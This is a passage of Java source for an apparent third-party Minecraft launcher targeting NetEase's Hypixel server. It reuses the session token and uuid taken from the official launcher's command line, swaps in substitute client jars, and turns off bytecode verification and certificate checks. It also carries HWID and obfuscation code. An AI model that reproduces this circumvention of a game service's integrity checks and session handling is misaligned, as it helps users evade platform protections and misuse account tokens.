            +"\n"
            +"New:"
            +NewMode
            +"\n"
            +"参数: "
            +System.getProperty("sun.java.command")
            +"\n"
            +"反编译/源码盗取/倒卖/泄露全家吸收钙磷钾~"
            ,"===关于===",2);
            }
        });

		menuBar.add(saveBtn);




		searchBtn = createBtn("Start!", "/img/Start.png");
        searchBtn.setHideActionText(true);
        searchBtn.setBorderPainted(false);
        searchBtn.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
            	JOptionPane.showMessageDialog(null, "第一次无法进服务器(或提示错误),重新进","提示",2);
                try {
					StartGame();
				} catch (Exception e1) {
					JOptionPane.showMessageDialog(null, e1.getMessage()+"\n"+e1.getStackTrace(),"错误",2);					 
					e1.printStackTrace();
				}               
            }
        });
        
        
        menuBar.add(searchBtn);
        
     
        JCheckBox checkBox1 = new JCheckBox("NoJoin");
        checkBox1.setFont(loadFont());;
        checkBox1.setSelected(del_ser);
        menuBar.add(checkBox1);
        checkBox1.addItemListener(new ItemListener()
        {
            public void itemStateChanged(ItemEvent event)
            {
                if(event.getStateChange()==1){
                	del_ser=true;     
                }else{
                	del_ser=false;  
                }
            }});
        JCheckBox checkBox2 = new JCheckBox("NoVerify");
        checkBox2.setSelected(noverify);
        menuBar.add(checkBox2);
        checkBox2.addItemListener(new ItemListener()
        {
            public void itemStateChanged(ItemEvent event)
            {
                if(event.getStateChange()==1){
                	noverify=true;            
                }else{
                	noverify=false;    
                }
            }});  
        JCheckBox checkBox3 = new JCheckBox("SysJava");
        checkBox3.setSelected(Sjava);
        menuBar.add(checkBox3);
        checkBox3.addItemListener(new ItemListener()
        {
            

			public void itemStateChanged(ItemEvent event)
            {
                if(event.getStateChange()==1){
                	Sjava=true;            
                }else{
                	Sjava=false;    
                }
            }});
        
        JCheckBox checkBox4 = new JCheckBox("1.8模式");
        menuBar.add(checkBox4);
        checkBox4.addItemListener(new ItemListener()
        {
            

			public void itemStateChanged(ItemEvent event)
            {
                if(event.getStateChange()==1){
                	is18Mode=true;            
                }else{
                	is18Mode=false;    
                }
            }});
		//searchBtn.setEnabled(false);
 
        JCheckBox checkBox42 = new JCheckBox("日志输出");
        checkBox42.setSelected(log);
        menuBar.add(checkBox42);
        checkBox42.addItemListener(new ItemListener()
        {
			public void itemStateChanged(ItemEvent event)
            {
                if(event.getStateChange()==1){
                	log=true;            
                }else{
                	log=false;    
                }
            }});
        
	return menuBar;
	}

	
  
	public void StartGame() throws Exception {
		if(uuid.equals("") && !NewMode){			
		JOptionPane.showMessageDialog(null,"请先用网易启动MC！","BUG",2);
		return;
		}
		String args=BuildArgs().toString();
		System.out.print(args);
		System.gc();
       

		
		JOptionPane.showMessageDialog(null,"按确定启动会提示游戏崩溃，请等待！"+java_dir,"BUG",2);

	//	savesettings();

		 if(DeBug) JOptionPane.showInputDialog(null, "\n", args ).toString();  
         
	        ExecutorService executor = Executors.newCachedThreadPool();
	        FutureTask<String> future = new FutureTask<String>(new Callable<String>() {
	            public String call() throws Exception{ //建议抛出异常
	                try {
	                     killself();
	                	 System.gc();
	                	
	            		 StringTokenizer st = new StringTokenizer(args);
	            	     String[] cmdarray = new String[st.countTokens()];
	            	     for (int i = 0; st.hasMoreTokens(); i++)
	            	            cmdarray[i] = st.nextToken();
	            		
	            	     System.out.println("ok");
	            	     ProcessBuilder game = new ProcessBuilder(cmdarray);
	            	     Process start = game.start();
	            		 
	            	        Scanner scanner = new Scanner(start.getInputStream());
	            	        // 将扫描到的字符流输出到指定的JTextArea组件
	            	        while (scanner.hasNextLine()) {
	            	            try {
	            	            	if(!log){
	            	            	scanner.close();
	            	            	break;
	            	            	}
	            	            	Thread.sleep(250);
	            	            	System.out.println(scanner.nextLine());
	            	            }finally{}
	            	        }
	            	     
	            		 start.waitFor();
	            		 
	            		 FMLCommonHandler.instance().exitJava(-1, true);	                      
	                     System.gc();   
	                }
	                catch(Exception e) {
	                    throw new Exception("Exception!"); 
	                }
					return "";
	            }
	        });
	        executor.execute(future);
	        executor.shutdown();
	        

	    
	
		 
		 


  //      Runtime.getRuntime().exit(-1);
  //      Runtime.getRuntime().exit(-1);
 //       FMLCommonHandler.instance().exitJava(-1, true);
  //      Process p2 = Runtime.getRuntime().exec(args);
	    
	    
	    
	}

	
	public void killself(){
		this.dispose();
	}
	
	


	
	
	public static String getJava() throws Exception {
        final List<String> ans = new ArrayList();
        try {
            final String[] cmd = { "cmd", "/c", "reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\JavaSoft\\Java Runtime Environment" };
            final Process jp = new ProcessBuilder(cmd).start();
            final ArrayList<String> lines = new ArrayList<String>();
            final BufferedReader br = new BufferedReader(new InputStreamReader(jp.getInputStream()));
            Throwable t = null;
            try {
                jp.waitFor();
                String line;
                while ((line = br.readLine()) != null) {
                    lines.add(line);
                }
            }
            catch (Throwable t2) {
                t = t2;
                throw t2;
            }
            finally {
                if (br != null) {
                    if (t != null) {
                        try {
                            br.close();
                        }
                        catch (Throwable t3) {}
                    }
                    else {
                        br.close();
                    }
                }
            }
            final List<String> l = lines;
            final List<String> ans2 = new ArrayList<String>();
            for (final String line : l) {
                if (line.startsWith("HKEY_LOCAL_MACHINE\\SOFTWARE\\JavaSoft\\Java Runtime Environment") && !line.equals("HKEY_LOCAL_MACHINE\\SOFTWARE\\JavaSoft\\Java Runtime Environment")) {
                    ans2.add(line);
                }
            }
            for (final String java : ans2) {
                int s = 0;
                for (final char c : java.toCharArray()) {
                    if (c == '.') {
                        ++s;
                    }
                }
                if (s <= 1) {
                    continue;
                }

                final String[] cmd2 = { "cmd", "/c", "reg", "query", java, "/v", "JavaHome" };
                final Process jp2 = new ProcessBuilder(cmd2).start();
                final ArrayList<String> lines2 = new ArrayList<String>();
                final BufferedReader br2 = new BufferedReader(new InputStreamReader(jp2.getInputStream()));
                Throwable t2 = null;
                try {
                    jp2.waitFor();
                    String line;
                    while ((line = br2.readLine()) != null) {
                        lines.add(line);
                    }
                }
                catch (Throwable t299) {
                }
                finally {
                    if (br != null) {
                        if (t != null) {
                            try {
                                br.close();
                            }
                            catch (Throwable t3) {}
                        }
                        else {
                            br.close();
                        }
                    }
                }
                final List<String> l2 = lines;
                boolean last = false;
                for (String s2 : l2) {
                    if (s2.trim().isEmpty()) {
                        continue;
                    }
                    if (last && s2.trim().startsWith("JavaHome")) {
                        int begins = s2.indexOf("JavaHome");
                        if (begins > 0) {
                            s2 = s2.substring(begins + "JavaHome".length());
                            begins = s2.indexOf("REG_SZ");
                            if (begins > 0) {
                                s2 = s2.substring(begins + "REG_SZ".length());
                                if (s2.trim() == null) {
                                    continue;
                                }
                                ans.add(s2.trim());
                            }
                        }
                    }
                    if (!s2.trim().equals(java)) {
                        continue;
                    }
                    last = true;
                }
            }

        }
        catch (IOException | InterruptedException ex3) {
            final Exception ex2;

   
        }
        return "\""+ans.toArray()[0]+"\\bin\\java.exe"+"\"";
    }
	
	private static StringBuilder BuildArgs() throws Exception{

		//del_ser  Launch_ver
	StringBuilder strb = new StringBuilder();
//	String java_dir="java";

    if(port==null){
    	port = Integer.parseInt(System.getProperty("launcherControlPort"));
    }
    	
    
	  if(Sjava){
		java_dir=getJava();
		  
		}else{
		  java_dir="CMD.EXE /C "+"java";
	  }
   //  if(path!=null) java_dir=path;
	  
	if(noverify){
		strb.append(java_dir+" "+"-Xverify:none -DlauncherControlPort="+port+" ");	
	}else{
		strb.append(java_dir+" "+"-DlauncherControlPort="+port+" ");
	}
	

	
    RuntimeMXBean bean = ManagementFactory.getRuntimeMXBean();
    List<String> jvmArgs = bean.getInputArguments();
    
    for (int i = 0; i < jvmArgs.size(); i++) {
      System.out.println( jvmArgs.get( i ) );
      if(NewMode && !is18Mode){
      strb.append(jvmArgs.get( i ).replace("Hello Minecraft! Launcher", "Ho3_Client_launcher").replace("-Xmx", "-Xmx1").replace("natives", "natlves")+" ");          	  
      }else{
      strb.append(jvmArgs.get( i ).replace("Hello Minecraft! Launcher", "Ho3_Client_launcher").replace("-Xmx", "-Xmx1")+" ");
      }
  }
    

 //  if(!smode){
//	   strb.append("-Dfml.ignoreInvalidMinecraftCertificates=true -Dfml.ignorePatchDiscrepancies=true -cp \"" + System.getProperty("java.class.path").replace("1.8.8.jar", Launch_ver).replace("libraries", System.getProperty("user.dir")+"\\"+"libraries\\").replace("versions", System.getProperty("user.dir")+"\\"+"versions\\") + "\" ");		    
 //  }else{
//	   strb.append("-Dfml.ignoreInvalidMinecraftCertificates=true -Dfml.ignorePatchDiscrepancies=true -cp \"" + System.getProperty("java.class.path").replace("1.8.8.jar", Launch_ver).replace("libraries", System.getProperty("user.dir").replace("\\versions\\1.8.8", "")+"\\"+"libraries\\").replace("\\versions\\1.8.8", System.getProperty("user.dir")+"\\"+"") + "\" ");		       
  // }
    if(NewMode){ 
    	if(is18Mode)
        strb.append("-DlauncherControlPort="+port+" -Dfml.ignoreInvalidMinecraftCertificates=true -Dfml.ignorePatchDiscrepancies=true -cp \"" + LibUntils.get18(System.getProperty("user.dir")).replace("ClientLauncher.jar", Launch_ver).replace("authlib-1.5.21.jar","authlib163-1.5.21.jar").replace("Game\\.minecraft\\.minecraft\\", "Game\\.minecraft\\")+"\" ");	
    	else
        strb.append("-DlauncherControlPort="+port+" -Dfml.ignoreInvalidMinecraftCertificates=true -Dfml.ignorePatchDiscrepancies=true -cp \"" + LibUntils.get189(System.getProperty("user.dir")).replace("ClientLauncher.jar", Launch_ver).replace("authlib-1.5.21.jar","authlib163-1.5.21.jar").replace("Game\\.minecraft\\.minecraft\\", "Game\\.minecraft\\")+"\" ");	 		
    }else{
      if(Launch_ver.toLowerCase().contains("sigma") || Launch_ver.toLowerCase().contains("nivia"))
      strb.append("-DlauncherControlPort="+port+" -Dfml.ignoreInvalidMinecraftCertificates=true -Dfml.ignorePatchDiscrepancies=true -cp \"" + System.getProperty("java.class.path").replace("ClientLauncher.jar", Launch_ver).replace("authlib-1.5.21.jar","authlib163-1.5.21.jar").replace("4.0.23.Final", "4.0.15.Final")+"\" ");
      else
      strb.append("-DlauncherControlPort="+port+" -Dfml.ignoreInvalidMinecraftCertificates=true -Dfml.ignorePatchDiscrepancies=true -cp \"" + System.getProperty("java.class.path").replace("ClientLauncher.jar", Launch_ver).replace("authlib-1.5.21.jar","authlib163-1.5.21.jar")+"\" ");
    } 	  

      strb.append(Mainclass+" ");
      
      //  String maisn = System.getProperty("sun.java.command");
      //  String str = strb.append(maisn.substring(0,maisn.indexOf(" "))).toString();
      //  String substr = str.substring(0,str.indexOf(" --userProperties"));
      if(NewMode){
    	  String maisn = System.getProperty("sun.java.command");
    	  String line = maisn;
  		  uuid = line.substring(line.lastIndexOf("--uuid ")+7,line.indexOf(" --accessToken")).replace(" ", "");
  		  token = line.substring(line.lastIndexOf("--accessToken ")+14,line.lastIndexOf("--accessToken ")+47).replace(" ", "");
  		  Uname = line.substring(line.lastIndexOf("--username ")+11,line.indexOf(" --version")).replace(" ", "");
  	   }
      
      String fos ="--username \""+Uname+"\" --version 1.8.9 --assetIndex 1.8.9 --uuid "+uuid+" --accessToken "+token+" --userProperties {} --gameDir "+System.getProperty("user.dir")+" --assetsDir "+System.getProperty("user.dir")+"\\assets";
      if(del_ser){
      System.out.println("1");
      strb.append(fos);
      }else{
      System.out.println("2");
      strb.append(fos+" --server x19hypixel.nie.netease.com --port 25565");	  
      }
    
		return strb;
}
	
	private Font loadFont(){
		try{
			InputStream aixing = Launch.class.getResourceAsStream( "/fonts/Roboto-Thin.ttf" );
			Font dynamicFont = Font.createFont( Font.TRUETYPE_FONT, aixing );
			Font dynamicFontPt = dynamicFont.deriveFont( Font.PLAIN, 15 );
			aixing.close();
			return(dynamicFontPt);
		}
		catch ( Exception e ) {
			e.printStackTrace();
			return(new java.awt.Font( "微软雅黑", Font.PLAIN, 14 ) );
		}		
	}
	
	public static Font loadFont2(){
		try{
			InputStream aixing = Launch.class.getResourceAsStream( "/fonts/Roboto-Thin.ttf" );
			Font dynamicFont = Font.createFont( Font.TRUETYPE_FONT, aixing );
			Font dynamicFontPt = dynamicFont.deriveFont( Font.PLAIN, 15 );
			aixing.close();
			return(dynamicFontPt);
		}
		catch ( Exception e ) {
			e.printStackTrace();
			return(new java.awt.Font( "微软雅黑", Font.PLAIN, 14 ) );
		}		
	}
	
	
	/**
	 * 创建工具栏按钮
	 * 
	 * @author lqj
	 * @param text
	 *            按钮名称
	 * @param icon
	 *            按钮图标所在路径
	 * @return 返回添加样式和监听器后的按钮
	 */
	private JButton createBtn(String text, String icon) {
		java.net.URL imUrl = getClass().getResource(icon); 
		ImageIcon im = new ImageIcon(imUrl);
		JButton btn = new JButton(text, im);
		btn.setUI(new BasicButtonUI());// 恢复基本视觉效果
		btn.setPreferredSize(new Dimension(80, 27));// 设置按钮大小
		btn.setContentAreaFilled(false);// 设置按钮透明
		btn.setFont(loadFont());// 按钮文本样式
		btn.setMargin(new Insets(0, 0, 0, 0));// 按钮内容与边框距离
		btn.addMouseListener(new MyMouseListener(this));
		return btn;
	}

	/**
	 * @author lqj
	 * 初始化主面板和工作栏内容
	 * @return 
	 * @throws IOException 
	 */
	

	private static boolean minecraftsda = false;
	
	private void init() throws Exception {	
		JMenuBar menuBar=null;
		try {
			String IiI2IiIiIiiIiIiIIiIiIiIiIyi = "sssssssssssssssssssss3sssssssssssssssssssssssssssssssssssssssssssssssss";
			String u2IiIIiIiIiiIiIiIIiIiIi3IiyIi = "sssssssssssss5sssssssssssssssssssssssssssssssssssssssssssssssssssssssss";
			String t2I2iIIiI2iIiiIiIiI3IiIiIiIiyIi = "ssssssssssssssssssss3sssssssssssssssssssssssssssssssssssssssssssssssss";
			String IiI2IiI2iIii2iiI2iIiIIiIiIiIyiIi = "ssssssssssssssssss3ssssssssssssssssssssssssssssssssssssssssssssssssssssss";
			String IiIIi2IiIiiIiI2iI22IiIiIiIyiIi = "ssssssssssssssssssssssssss3sssssssssssssssssssssssssssssssssssssssss";
			String IiII2iI2iIi2iIiIiIIiIiIiIiyIi = "ssssssssssssssssssssssssssss3ssssssssssssssssssssssssssssssssssss";		
			String I2iIIiI2iIiiIiIiIIiIiIiIyiIi = "ssssssssssssss3ssssssssssssssssssssssssssssssssssssssssssss";
			if(minecraftsda = Hwid())
				menuBar = addMenuBar();
			String IiIIi2Ii3IiiIiI2iI22IiIiIiIyiIi = "ssssssssssssssssssssssssss3sssssssssssssssssssssssssssssssssssssssss";
			String IiII23iI2iIi2iIiIiIIiIiIiIiyIi = "ssssssssssssssssssssssssssss3ssssssssssssssssssssssssssssssssssss";		
			String I2iIIiI2iIi6iIiIiIIiIiIiIyiIi = "ssssssssssssss3ssssssssssssssssssssssssssssssssssssssssssss";
		} catch (Exception e) {
			Runtime.getRuntime().exit(-1);
		}
		;
		;
		;
		;
		anticrack();
		NetEaseControl.CheckStart();
		menuBar.setPreferredSize(new Dimension(1400, 30));
		this.setJMenuBar(menuBar);
		this.setSize(860, 537);
		this.setLocationRelativeTo(null);
		this.setVisible(true);
		this.setTitle("Client Launcher b"+ver);
		this.setDefaultCloseOperation(EXIT_ON_CLOSE);
		this.setIconImage(ImageIO.read(Launch.class.getResource("/img/icon.png")));
	    AWTUtilities.setWindowShape(this, new RoundRectangle2D.Double(  
	              0.0D, 0.0D, this.getWidth(), this.getHeight(), 26.0D,  
	              26.0D));  
	}




	
	

	public static void main(String[] args) throws Exception {
	//	System.setSecurityManager(new JvmManager( System.getSecurityManager() ));
    //	Hwid();
	//	if(!System.getProperty("user.dir").contains(".minecraft")){
	//		NewMode = true;
	//		System.setProperty("user.dir", System.getProperty("user.dir")+"\\.minecraft");
	//	}
	//	System.setSecurityManager(null);
		if(args==null){
			NewMode = true;
		}
        new Launch().setVisible(true);  
	}


}

